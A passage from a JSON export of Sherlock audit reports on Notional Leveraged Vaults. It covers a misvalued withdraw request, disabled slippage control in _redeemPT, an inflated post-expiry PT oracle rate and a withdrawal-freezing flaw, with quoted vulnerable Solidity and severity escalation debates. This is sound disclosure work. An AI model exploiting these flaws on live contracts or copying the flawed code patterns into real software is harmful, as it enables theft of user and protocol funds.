doesn't get anything, it's a clear loss of the entire withdrawal without external limitations.\n\nPlanning to accept the escalation and leave the issue as it is.\n\n**WangSecurity**\n\nResult:\nHigh \nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [xiaoming9090](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/105/#issuecomment-2227181802): accepted",
      "summary": "\nThe report discusses a bug in the `KelpCooldownHolder` contract found by several individuals. The contract is responsible for withdrawing rsETH to stETH and then stETH to ETH. However, it contains a flaw that allows an adversary to freeze the withdrawal process by calling `LidoWithdraw.requestWithdrawals` with a small amount of stETH and the holder's address. This causes the withdrawal to be permanently locked and cannot be rescued. The flaw is due to the `KelpCooldownHolder._finalizeCooldown` function being hardcoded to claim the 0-th request from `LidoWithdraw.getWithdrawalRequests`, meaning any other requests will be ignored. This can be exploited by an adversary by requesting withdrawals before the `triggerExtraStep` is called, causing the real withdrawal request to be ignored. The report includes a proof of concept demonstrating the attack. The impact of this bug is considered medium, but some individuals believe it should be escalated to high due to the potential loss of assets and undervalued collateral. The judge has accepted the escalation and the bug has been classified as high with duplicates. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/105",
      "tags": [],
      "finders": [
        "BiasedMerc",
        "lemonmon",
        "xiaoming90"
      ]
    },
    {
      "id": "35125",
      "title": "H-12: The withdrawValue calculation in _calculateValueOfWithdrawRequest is incorrect.",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/78 \n\n## Found by \nZeroTrust\nThe withdrawValue calculation in _calculateValueOfWithdrawRequest is incorrect.\n## Summary\nThe withdrawValue calculation in _calculateValueOfWithdrawRequest is incorrect.\n## Vulnerability Detail\n```javascript\nfunction _calculateValueOfWithdrawRequest(\n        WithdrawRequest memory w,\n        uint256 stakeAssetPrice,\n        address borrowToken,\n        address redeemToken\n    ) internal view returns (uint256 borrowTokenValue) {\n        if (w.requestId == 0) return 0;\n\n        // If a withdraw request has split and is finalized, we know the fully realized value of\n        // the withdraw request as a share of the total realized value.\n        if (w.hasSplit) {\n            SplitWithdrawRequest memory s = VaultStorage.getSplitWithdrawRequest()[w.requestId];\n            if (s.finalized) {\n                return _getValueOfSplitFinalizedWithdrawRequest(w, s, borrowToken, redeemToken);\n            }\n        }\n\n        // In every other case, including the case when the withdraw request has split, the vault shares\n        // in the withdraw request (`w`) are marked at the amount of vault shares the account holds.\n@>>        return _getValueOfWithdrawRequest(w, stakeAssetPrice);\n    }\n```\nWe can see that for cases without hasSplit or with hasSplit but not finalized, the value is calculated using _getValueOfWithdrawRequest. Let’s take a look at `PendlePTEtherFiVault::_getValueOfWithdrawRequest()`.\n\n```javascript\nfunction _getValueOfWithdrawRequest(\n        WithdrawRequest memory w, uint256 /* */\n    ) internal override view returns (uint256) {\n@>>        uint256 tokenOutSY = getTokenOutSYForWithdrawRequest(w.requestId);\n        // NOTE: in this vault the tokenOutSy is known to be weETH.\n        (int256 weETHPrice, /* */) = TRADING_MODULE.getOraclePrice(TOKEN_OUT_SY, BORROW_TOKEN);\n        return (tokenOutSY * weETHPrice.toUint() * BORROW_PRECISION) /\n            (WETH_PRECISION * Constants.EXCHANGE_RATE_PRECISION);\n    }\n```\nHere, tokenOutSY represents the total amount of WETH requested for withdrawal, not just the portion represented by the possibly split w.vaultShares. Therefore, _getValueOfWithdrawRequest returns the entire withdrawal value. If a WithdrawRequest has been split but not finalized, this results in an incorrect calculation.\n\nThis issue also occurs in `PendlePTKelpVault::_getValueOfWithdrawRequest()`.\n```javascript\nfunction _getValueOfWithdrawRequest(\n        WithdrawRequest memory w, uint256 /* */\n    ) internal override view returns (uint256) {\n        return KelpLib._getValueOfWithdrawRequest(w, BORROW_TOKEN, BORROW_PRECISION);\n    }\n//KelpLib._getValueOfWithdrawRequest) function\nfunction _getValueOfWithdrawRequest(\n        WithdrawRequest memory w,\n        address borrowToken,\n        uint256 borrowPrecision\n    ) internal view returns (uint256) {\n        address holder = address(uint160(w.requestId));\n\n        uint256 expectedStETHAmount;\n        if (KelpCooldownHolder(payable(holder)).triggered()) {\n            uint256[] memory requestIds = LidoWithdraw.getWithdrawalRequests(holder);\n            ILidoWithdraw.WithdrawalRequestStatus[] memory withdrawsStatus = LidoWithdraw.getWithdrawalStatus(requestIds);\n\n            expectedStETHAmount = withdrawsStatus[0].amountOfStETH;\n        } else {\n            (/* */, expectedStETHAmount, /* */, /* */) = WithdrawManager.getUserWithdrawalRequest(stETH, holder, 0);\n\n        }\n\n        (int256 stETHToBorrowRate, /* */) = Deployments.TRADING_MODULE.getOraclePrice(\n            address(stETH), borrowToken\n        );\n            //@audit not the w.vaulteShares\n@>>        return (expectedStETHAmount * stETHToBorrowRate.toUint() * borrowPrecision) /\n            (Constants.EXCHANGE_RATE_PRECISION * stETH_PRECISION);\n    }\n```\n\nThis issue also occurs in `PendlePTStakedUSDeVault::_getValueOfWithdrawRequest()`.\n```javascript\nfunction _getValueOfWithdrawRequest(\n        WithdrawRequest memory w, uint256 /* */\n    ) internal override view returns (uint256) {\n        // NOTE: This withdraw valuation is not based on the vault shares value so we do not\n        // need to use the PendlePT metadata conversion.\n        return EthenaLib._getValueOfWithdrawRequest(w, BORROW_TOKEN, BORROW_PRECISION);\n    }\n//EthenaLib._getValueOfWithdrawRequest()\nfunction _getValueOfWithdrawRequest(\n        WithdrawRequest memory w,\n        address borrowToken,\n        uint256 borrowPrecision\n    ) internal view returns (uint256) {\n        address holder = address(uint160(w.requestId));\n        // This valuation is the amount of USDe the account will receive at cooldown, once\n        // a cooldown is initiated the account is no longer receiving sUSDe yield. This balance\n        // of USDe is transferred to a Silo contract and guaranteed to be available once the\n        // cooldown has passed.\n        IsUSDe.UserCooldown memory userCooldown = sUSDe.cooldowns(holder);\n\n        int256 usdeToBorrowRate;\n        if (borrowToken == address(USDe)) {\n            usdeToBorrowRate = int256(Constants.EXCHANGE_RATE_PRECISION);\n        } else {\n            // If not borrowing USDe, convert to the borrowed token\n            (usdeToBorrowRate, /* */) = Deployments.TRADING_MODULE.getOraclePrice(\n                address(USDe), borrowToken\n            );\n        }\n        //@audit not the w.vaulteShares\n@>>        return (userCooldown.underlyingAmount * usdeToBorrowRate.toUint() * borrowPrecision) /\n            (Constants.EXCHANGE_RATE_PRECISION * USDE_PRECISION);\n    }\n```\nThe calculation is correct only in `EtherFiVault::_getValueOfWithdrawRequest()` .\n```javascript\nfunction _getValueOfWithdrawRequest(\n        WithdrawRequest memory w, uint256 weETHPrice\n    ) internal override view returns (uint256) {\n        return EtherFiLib._getValueOfWithdrawRequest(w, weETHPrice, BORROW_PRECISION);\n    }\n//EtherFiLib._getValueOfWithdrawRequest() function\nfunction _getValueOfWithdrawRequest(\n        WithdrawRequest memory w,\n        uint256 weETHPrice,\n        uint256 borrowPrecision\n    ) internal pure returns (uint256) {\n            //@audit this is correct, using vaultShares\n@>>        return (w.vaultShares * weETHPrice * borrowPrecision) /\n            (uint256(Constants.INTERNAL_TOKEN_PRECISION) * Constants.EXCHANGE_RATE_PRECISION);\n    }\n```\n\n## Impact\nOverestimation of user assets can lead to scenarios where users should have been liquidated but were not, resulting in losses for the protocol.\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/common/WithdrawRequestBase.sol#L86\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/staking/PendlePTEtherFiVault.sol#L46\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Kelp.sol#L114\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/Ethena.sol#L77\n## Tool used\n\nManual Review\n\n## Recommendation\nModify the relevant calculation formulas.\n\n\n\n## Discussion\n\n**0502lian**\n\nEscalate\n\nThis should be considered a High issue.\n\nAlthough _calculateValueOfWithdrawRequest is just a view function, it is used by BaseStakingVault::convertStrategyToUnderlying to evaluate the value of a user’s shares in the staking Vault.\n```javascript\n function convertStrategyToUnderlying(\n        address account,\n        uint256 vaultShares,\n        uint256 /* maturity */\n    ) public virtual override view returns (int256 underlyingValue) {\n        uint256 stakeAssetPrice = uint256(getExchangeRate(0));\n\n        WithdrawRequest memory w = getWithdrawRequest(account);\n@>        uint256 withdrawValue = _calculateValueOfWithdrawRequest(\n            w, stakeAssetPrice, BORROW_TOKEN, REDEMPTION_TOKEN\n        );\n        // This should always be zero if there is a withdraw request.\n        uint256 vaultSharesNotInWithdrawQueue = (vaultShares - w.vaultShares);\n\n        uint256 vaultSharesValue = (vaultSharesNotInWithdrawQueue * stakeAssetPrice * BORROW_PRECISION) /\n            (uint256(Constants.INTERNAL_TOKEN_PRECISION) * Constants.EXCHANGE_RATE_PRECISION);\n@>        return (withdrawValue + vaultSharesValue).toInt();\n    }\n```\n\nIn Notional V3, the function calculateAccountHealthFactors calculates a user’s health condition by calling getPrimaryUnderlyingValueOfShare, which in turn calls the vault's convertStrategyToUnderlying.\n\nhttps://github.com/notional-finance/contracts-v3/blob/b664c157051d256ce583ba19da3e26c6cf5061ac/contracts/internal/vaults/VaultValuation.sol#L173\n```javascript\n/// @notice Calculates account health factors for liquidation.\n    function calculateAccountHealthFactors(\n        VaultConfig memory vaultConfig,\n        VaultAccount memory vaultAccount,\n        VaultState memory vaultState,\n        PrimeRate[2] memory primeRates\n    ) internal view returns (\n        VaultAccountHealthFactors memory h,\n        VaultSecondaryBorrow.SecondaryExchangeRates memory er\n    ) {\n@>>        h.vaultShareValueUnderlying = getPrimaryUnderlyingValueOfShare(\n            vaultState, vaultConfig, vaultAccount.account, vaultAccount.vaultShares\n        );\n\n       //-------skip-----\n    }\n\n```\nhttps://github.com/notional-finance/contracts-v3/blob/b664c157051d256ce583ba19da3e26c6cf5061ac/contracts/internal/vaults/VaultValuation.sol#L54\n```javascript\n/// @notice Returns the value in underlying of the primary borrow currency portion of vault shares.\n    function getPrimaryUnderlyingValueOfShare(\n        VaultState memory vaultState,\n        VaultConfig memory vaultConfig,\n        address account,\n        uint256 vaultShares\n    ) internal view returns (int256) {\n        if (vaultShares == 0) return 0;\n\n        Token memory token = TokenHandler.getUnderlyingToken(vaultConfig.borrowCurrencyId);\n        return token.convertToInternal(\n@>>            IStrategyVault(vaultConfig.vault).convertStrategyToUnderlying(account, vaultShares, vaultState.maturity)\n        );\n    }\n```\n\nWhether a user’s position should be liquidated is determined based on calculateAccountHealthFactors.\n\n**Therefore, as stated in the scope of impact in my report, “Overestimation of user assets can lead to scenarios where users should have been liquidated but were not, resulting in losses for the protocol.”**\n\nAlso considering the widespread nature of the error, in this audit, the calculation in PendlePTEtherFiVault, PendlePTKelpVault, PendlePTStakedUSDeVault, and EthenaVault is incorrect.\n\nThe impact of this error is High, and the likelihood of occurrence is between medium and high, according to Sherlock’s rules on how to identify a high issue:\n“Definite loss of funds without (extensive) limitations of external conditions.”\nTherefore, it should be judged as High.\n\n**sherlock-admin3**\n\n> Escalate\n> \n> This should be considered a High issue.\n> \n> Although _calculateValueOfWithdrawRequest is just a view function, it is used by BaseStakingVault::convertStrategyToUnderlying to evaluate the value of a user’s shares in the staking Vault.\n> ```javascript\n>  function convertStrategyToUnderlying(\n>         address account,\n>         uint256 vaultShares,\n>         uint256 /* maturity */\n>     ) public virtual override view returns (int256 underlyingValue) {\n>         uint256 stakeAssetPrice = uint256(getExchangeRate(0));\n> \n>         WithdrawRequest memory w = getWithdrawRequest(account);\n> @>        uint256 withdrawValue = _calculateValueOfWithdrawRequest(\n>             w, stakeAssetPrice, BORROW_TOKEN, REDEMPTION_TOKEN\n>         );\n>         // This should always be zero if there is a withdraw request.\n>         uint256 vaultSharesNotInWithdrawQueue = (vaultShares - w.vaultShares);\n> \n>         uint256 vaultSharesValue = (vaultSharesNotInWithdrawQueue * stakeAssetPrice * BORROW_PRECISION) /\n>             (uint256(Constants.INTERNAL_TOKEN_PRECISION) * Constants.EXCHANGE_RATE_PRECISION);\n> @>        return (withdrawValue + vaultSharesValue).toInt();\n>     }\n> ```\n> \n> In Notional V3, the function calculateAccountHealthFactors calculates a user’s health condition by calling getPrimaryUnderlyingValueOfShare, which in turn calls the vault's convertStrategyToUnderlying.\n> \n> https://github.com/notional-finance/contracts-v3/blob/b664c157051d256ce583ba19da3e26c6cf5061ac/contracts/internal/vaults/VaultValuation.sol#L173\n> ```javascript\n> /// @notice Calculates account health factors for liquidation.\n>     function calculateAccountHealthFactors(\n>         VaultConfig memory vaultConfig,\n>         VaultAccount memory vaultAccount,\n>         VaultState memory vaultState,\n>         PrimeRate[2] memory primeRates\n>     ) internal view returns (\n>         VaultAccountHealthFactors memory h,\n>         VaultSecondaryBorrow.SecondaryExchangeRates memory er\n>     ) {\n> @>>        h.vaultShareValueUnderlying = getPrimaryUnderlyingValueOfShare(\n>             vaultState, vaultConfig, vaultAccount.account, vaultAccount.vaultShares\n>         );\n> \n>        //-------skip-----\n>     }\n> \n> ```\n> https://github.com/notional-finance/contracts-v3/blob/b664c157051d256ce583ba19da3e26c6cf5061ac/contracts/internal/vaults/VaultValuation.sol#L54\n> ```javascript\n> /// @notice Returns the value in underlying of the primary borrow currency portion of vault shares.\n>     function getPrimaryUnderlyingValueOfShare(\n>         VaultState memory vaultState,\n>         VaultConfig memory vaultConfig,\n>         address account,\n>         uint256 vaultShares\n>     ) internal view returns (int256) {\n>         if (vaultShares == 0) return 0;\n> \n>         Token memory token = TokenHandler.getUnderlyingToken(vaultConfig.borrowCurrencyId);\n>         return token.convertToInternal(\n> @>>            IStrategyVault(vaultConfig.vault).convertStrategyToUnderlying(account, vaultShares, vaultState.maturity)\n>         );\n>     }\n> ```\n> \n> Whether a user’s position should be liquidated is determined based on calculateAccountHealthFactors.\n> \n> **Therefore, as stated in the scope of impact in my report, “Overestimation of user assets can lead to scenarios where users should have been liquidated but were not, resulting in losses for the protocol.”**\n> \n> Also considering the widespread nature of the error, in this audit, the calculation in PendlePTEtherFiVault, PendlePTKelpVault, PendlePTStakedUSDeVault, and EthenaVault is incorrect.\n> \n> The impact of this error is High, and the likelihood of occurrence is between medium and high, according to Sherlock’s rules on how to identify a high issue:\n> “Definite loss of funds without (extensive) limitations of external conditions.”\n> Therefore, it should be judged as High.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**0502lian**\n\nAdditional information:\n\nThis issue has the same impact as issue 60\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/60, \nalthough the error occurs in slightly different ways; issue 60 is caused by token precision errors, while this issue is due to incorrect share referencing. There is no reason why issue 60 is high while this issue is considered medium.\n\n**T-Woodward**\n\nYes I think this is correct. Definitely should be a high severity issue\n\n**mystery0x**\n\nI still think medium rating will be more appropriate but will let the Sherlock judge decide on it:\n\nIn case any of these incorrect values returned by the view functions are used as a part of a larger function which would result in loss of funds then it would be a valid medium/high depending on the impact.\n\n**WangSecurity**\n\n@0502lian I see that the functions mentioned in the escalation, which in the end call the`calculateValueOfWithdrawRequest`, are all view functions, but some of them internal, so I assume there are non-view functions that interact with them. Can you please forward me to them?\n\n**0502lian**\n\n## 1 About the Call Chain\n\nNotional is a very complex protocol.\nhttps://github.com/notional-finance/contracts-v3/blob/b664c157051d256ce583ba19da3e26c6cf5061ac/contracts/external/actions/VaultLiquidationAction.sol#L58\n```javascript\n  function deleverageAccount(\n        address account,\n        address vault,\n        address liquidator,\n        uint16 currencyIndex,\n        int256 depositUnderlyingInternal\n    ) external payable nonReentrant override returns (\n        uint256 vaultSharesToLiquidator,\n        int256 depositAmountPrimeCash\n    ) {\n    //......skip.......... \n        // Currency Index is validated in this method\n        (\n            depositUnderlyingInternal,\n            vaultSharesToLiquidator,\n            pr\n@>>        ) = IVaultAccountHealth(address(this)).calculateDepositAmountInDeleverage(\n            currencyIndex, vaultAccount, vaultConfig, vaultState, depositUnderlyingInternal\n        );\n        //......skip..........\n    }\n\n```\nYou can see that the liquidation function deleverageAccount calls calculateDepositAmountInDeleverage().\n\nhttps://github.com/notional-finance/contracts-v3/blob/b664c157051d256ce583ba19da3e26c6cf5061ac/contracts/external/actions/VaultAccountHealth.sol#L252\n```javascript\nfunction calculateDepositAmountInDeleverage(\n        uint256 currencyIndex,\n        VaultAccount memory vaultAccount,\n        VaultConfig memory vaultConfig,\n        VaultState memory vaultState,\n        int256 depositUnderlyingInternal\n    ) external override returns (int256, uint256, PrimeRate memory) {\n        // This method is only intended for use during deleverage account\n   //............skip...........\n\n@>>            (h, er) = VaultValuation.calculateAccountHealthFactors(vaultConfig, vaultAccount, vaultState, primeRates);\n        //............skip...........\n\n\n```\ncalculateDepositAmountInDeleverage() calls calculateAccountHealthFactors(), which I listed in my last comment. Finally, it calls the problematic function.\n\n## 2 About the Sponsor\n\nThe sponsor has supported this issue as high priority in the above comments.\n“Yes I think this is correct. Definitely should be a high severity issue”\n\n## 3 About Severity Comparison\n\nAs I have already expressed above, issue 60 also affects the _getValueOfSplitFinalizedWithdrawRequest view function(called by _calculateValueOfWithdrawRequest()), but its severity is rated as High.\n\n**The evidence is so obvious. I understand that the Sherlock judge wants to get to the truth, but I don’t understand why the first judge ignored this evidence and still considered it to be of medium severity.**\n\n@WangSecurity \n\n**WangSecurity**\n\nBased on the comment above, I agree high severity is indeed appropriate here. Planning to accept the escalation and upgrade the severity.\n\n> The evidence is so obvious. I understand that the Sherlock judge wants to get to the truth, but I don’t understand why the first judge ignored this evidence and still considered it to be of medium severity\n\nThe problem here is that all the functions mentioned in the report and messages above you just say where the formula is incorrect. From judge's point of view it would be easier if you would make vulnerability path which function would be called and how this sequence of calls would lead to the impact. Just as an advice try to write your reports in a different way so it's easier to judge it correctly initially. Also, try new report templates, I think with them it will be a lot easier for both you and judges :)\n\n**WangSecurity**\n\nResult:\nHigh\nUnique\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [0502lian](https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/78/#issuecomment-2226677373): accepted",
      "summary": "\nThe withdrawValue calculation in _calculateValueOfWithdrawRequest is incorrect, which can lead to overestimation of user assets and potential losses for the protocol. This issue affects multiple functions in different vaults and should be considered as a High severity issue. The evidence for this issue is clear and the sponsor has also agreed that it should be treated as a high priority. Another similar issue has been rated as High severity, making this issue unique. Escalations have been resolved successfully and the final verdict is High severity and Unique.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/78",
      "tags": [],
      "finders": [
        "ZeroTrust"
      ]
    },
    {
      "id": "35124",
      "title": "H-11: Lack of slippage control on `_redeemPT` function",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/70 \n\n## Found by \nBiasedMerc, Ironsidesec, ZeroTrust, blackhole, brgltd, denzi\\_, lemonmon, pseudoArtist, xiaoming90\n## Summary\n\nThe slippage control on the `_redeemPT` function has been disabled. As a result, it can lead to a loss of assets. Slippage can occur naturally due to on-chain trading activities or the victim being sandwiched by malicious users/MEV.\n\n## Vulnerability Detail\n\nIn Line 137 of the `_redeemPT` function, the `minTokenOut` is set to `0`, which disables the slippage control. Note that redeeming one `TOKEN_OUT_SY` does not always give you one `netTokenOut`. Not all SY contracts will burn one share and return 1 yield token back. Inspecting the Pendle's source code will reveal that for some SY contracts, some redemption will involve withdrawing/redemption from external staking protocol or performing some swaps, which might suffer from some slippage.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/PendlePrincipalToken.sol#L137\n\n```solidity\nFile: PendlePrincipalToken.sol\n123:     /// @notice Handles PT redemption whether it is expired or not\n124:     function _redeemPT(uint256 vaultShares) internal returns (uint256 netTokenOut) {\n125:         uint256 netPtIn = getStakingTokensForVaultShare(vaultShares);\n126:         uint256 netSyOut;\n127: \n128:         // PT tokens are known to be ERC20 compatible\n129:         if (PT.isExpired()) {\n130:             PT.transfer(address(YT), netPtIn);\n131:             netSyOut = YT.redeemPY(address(SY));\n132:         } else {\n133:             PT.transfer(address(MARKET), netPtIn);\n134:             (netSyOut, ) = MARKET.swapExactPtForSy(address(SY), netPtIn, \"\");\n135:         }\n136: \n137:         netTokenOut = SY.redeem(address(this), netSyOut, TOKEN_OUT_SY, 0, true);\n138:     }\n```\n\nThe `_redeemPT` function is being used in two places:\n\n#### Instance 1 - Within `_executeInstantRedemption` function\n\nIf `TOKEN_OUT_SY == BORROW_TOKEN`, the code will accept any `netTokenOut` redeemed, even if it is fewer than expected due to slippage.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/PendlePrincipalToken.sol#L140\n\n```solidity\nFile: PendlePrincipalToken.sol\n140:     function _executeInstantRedemption(\n141:         address /* account */,\n142:         uint256 vaultShares,\n143:         uint256 /* maturity */,\n144:         RedeemParams memory params\n145:     ) internal override returns (uint256 borrowedCurrencyAmount) {\n146:         uint256 netTokenOut = _redeemPT(vaultShares);\n147: \n148:         if (TOKEN_OUT_SY != BORROW_TOKEN) {\n149:             Trade memory trade = Trade({\n150:                 tradeType: TradeType.EXACT_IN_SINGLE,\n151:                 sellToken: TOKEN_OUT_SY,\n152:                 buyToken: BORROW_TOKEN,\n153:                 amount: netTokenOut,\n154:                 limit: params.minPurchaseAmount,\n155:                 deadline: block.timestamp,\n156:                 exchangeData: params.exchangeData\n157:             });\n158: \n159:             // Executes a trade on the given Dex, the vault must have permissions set for\n160:             // each dex and token it wants to sell.\n161:             (/* */, borrowedCurrencyAmount) = _executeTrade(params.dexId, trade);\n162:         } else {\n163:             borrowedCurrencyAmount = netTokenOut;\n164:         }\n```\n\n#### Instance 2 - Within `_initiateWithdrawImpl` function\n\nThe code will accept any `tokenOutSy` redeemed, even if it is fewer than expected due to slippage, and proceed to withdraw them from external protocols.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/PendlePrincipalToken.sol#L171\n\n```solidity\nFile: PendlePrincipalToken.sol\n171:     function _initiateWithdrawImpl(\n172:         address account, uint256 vaultSharesToRedeem, bool isForced\n173:     ) internal override returns (uint256 requestId) {\n174:         // When doing a direct withdraw for PTs, we first redeem or trade out of the PT\n175:         // and then initiate a withdraw on the TOKEN_OUT_SY. Since the vault shares are\n176:         // stored in PT terms, we pass tokenOutSy terms (i.e. weETH or sUSDe) to the withdraw\n177:         // implementation.\n178:         uint256 tokenOutSy = _redeemPT(vaultSharesToRedeem);\n179:         requestId = _initiateSYWithdraw(account, tokenOutSy, isForced);\n180:         // Store the tokenOutSy here for later when we do a valuation check against the position\n181:         VaultStorage.getWithdrawRequestData()[requestId] = abi.encode(tokenOutSy);\n182:     }\n```\n\n## Impact\n\nLoss of assets due to lack of slippage control. Slippage can occur naturally due to on-chain trading activities or the victim being sandwiched by malicious users/MEV.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/PendlePrincipalToken.sol#L137\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider implementing the required slippage control.",
      "summary": "\nThe report highlights an issue with the `_redeemPT` function in the Pendle Principal Token contract. The slippage control has been disabled, which could result in a loss of assets. This can happen due to on-chain trading activities or malicious users. The vulnerability was found by several security researchers. The code snippet in line 137 shows that the `minTokenOut` is set to 0, which disables the slippage control. This function is used in two places within the contract, and in both instances, any `netTokenOut` redeemed will be accepted, even if it is less than expected due to slippage. This can lead to a loss of assets when withdrawing from external protocols. The impact of this vulnerability is a loss of assets. The recommendation is to implement the required slippage control to prevent this issue. The vulnerability was found through a manual review. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Notional Leveraged Vaults: Pendle PT and Vault Incentives",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/70",
      "tags": [],
      "finders": [
        "lemonmon",
        "Ironsidesec",
        "pseudoArtist",
        "denzi\\_",
        "ZeroTrust",
        "xiaoming90",
        "brgltd",
        "BiasedMerc",
        "blackhole"
      ]
    },
    {
      "id": "35123",
      "title": "H-10: Incorrect assumption that PT rate is 1.0 post-expiry",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/69 \n\n## Found by \nlemonmon, xiaoming90\n## Summary\n\nPT rate will be hardcoded to 1.0 post-expiry, which is incorrect. The price returned from the Notional's `PendlePTOracle` contract will be inflated. As a result, the account's collateral will be overinflated, allowing malicious users to borrow significantly more than the actual collateral value, stealing assets from the protocol.\n\n## Vulnerability Detail\n\nThe following are the configuration files for the PT weETH 27JUN2024 taken from the test files of the audit contest's repository. \n\nFor PT weETH 27JUN2024, note that the `useSyOracleRate` is set to `True`, as per Line 59 below.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/tests/Staking/PendlePTTests.yml#L51\n\n```solidity\nFile: PendlePTTests.yml\n51:   - stakeSymbol: weETH\n52:     forkBlock: 221089505\n53:     expiry: 27JUN2024\n54:     primaryBorrowCurrency: ETH\n55:     contractName: PendlePTGeneric\n56:     oracles: [ETH]\n57:     marketAddress: \"0x952083cde7aaa11AB8449057F7de23A970AA8472\"\n58:     ptAddress: \"0x1c27Ad8a19Ba026ADaBD615F6Bc77158130cfBE4\"\n59:     useSyOracleRate: 'true'\n60:     tradeOnEntry: true\n61:     primaryDex: UniswapV3\n```\n\nFor PT weETH 27JUN2024, note that the `useSyOracleRate` is set to `True`, as per Line 118 below.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/tests/generated/arbitrum/PendlePT_weETH_ETH.t.sol#L115\n\n```solidity\n File: PendlePT_weETH_ETH.t.sol\n115:         marketAddress = 0x952083cde7aaa11AB8449057F7de23A970AA8472;\n116:         ptAddress = 0x1c27Ad8a19Ba026ADaBD615F6Bc77158130cfBE4;\n117:         twapDuration = 15 minutes; // recommended 15 - 30 min\n118:         useSyOracleRate = true;\n119:         baseToUSDOracle = 0x9414609789C179e1295E9a0559d629bF832b3c04;\n120:         \n121:         tokenInSy = 0x35751007a407ca6FEFfE80b3cB397736D2cf4dbe;\n122:         borrowToken = 0x0000000000000000000000000000000000000000;\n123:         tokenOutSy = 0x35751007a407ca6FEFfE80b3cB397736D2cf4dbe;\n124:         redemptionToken = 0x35751007a407ca6FEFfE80b3cB397736D2cf4dbe;\n```\n\nIn this case, the `useSyOracleRate` is set to `True` in the `PendlePTOracle` contract.\n\nIn Line 115 below, the PT rate will be hardcoded to 1.0 post-expiry. Per the comment at Lines 113-114, it assumes that 1 unit of PT is worth 1 unit of the underlying SY at expiration. However, this assumption is incorrect.\n\nhttps://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/oracles/PendlePTOracle.sol#L113\n\n```solidity\nFile: PendlePTOracle.sol\n092:     function _calculateBaseToQuote() internal view returns (\n..SNIP..\n113:         // Past expiration, hardcode the PT oracle price to 1. It is no longer tradable and\n114:         // is worth 1 unit of the underlying SY at expiration.\n115:         int256 ptRate = expiry <= block.timestamp ? ptDecimals : _getPTRate();\n116: \n117:         answer = (ptRate * baseToUSD * rateDecimals) /\n118:             (baseToUSDDecimals * ptDecimals);\n119:     }\n```\n\nPer the [Pendle documentation](https://docs.pendle.finance/ProtocolMechanics/YieldTokenization/PT7):\n\n> In the case of reward-bearing assets, it’s particularly important to note that PT is redeemable 1:1 for the accounting asset, *NOT* the **underlying asset.\n>\n> For example, the value of Renzo ezETH increases overtime relative to ETH as staking and restaking rewards are accrued. For every 1 PT-ezETH you own, you’ll be able to redeem 1 ETH worth of ezETH upon maturity, *NOT* 1 ezETH which has a higher value**.**\n\nUsing PT weETH 27JUN2024, which is used within the ether.fi vault as an example:\n\n- Underlying assets = [weETH](https://arbiscan.io/address/0x35751007a407ca6feffe80b3cb397736d2cf4dbe) (Wrapped eETH)\n- SY = [SY weETH](https://arbiscan.io/address/0xa6c895eb332e91c5b3d00b7baeeaae478cc502da)\n- PT = [PT weETH 27JUN2024](https://arbiscan.io/address/0x1c27ad8a19ba026adabd615f6bc77158130cfbe4)\n- Market = https://arbiscan.io/address/0x952083cde7aaa11AB8449057F7de23A970AA8472 (isExpired = true)\n- Accounting assets = eETH = ETH\n\nPer the [Pendle's eETH market page](https://app.pendle.finance/trade/markets/0xf9f9779d8ff604732eba9ad345e6a27ef5c2a9d6/swap?view=pt&chain=arbitrum&py=output), it has stated that 1 PT eETH is equal to 1 eETH (also equal to 1 ETH) at maturity.\n\n<img width=\"458\" alt=\"image-2024070193926709 PM\" src=\"https://github.com/sherlock-audit/2024-06-leveraged-vaults-xiaoming9090/assets/102820284/398f979c-3936-4a03-a970-281c53981e39\">\n\nHowever, as noted earlier, the code assumes that one unit of PT is 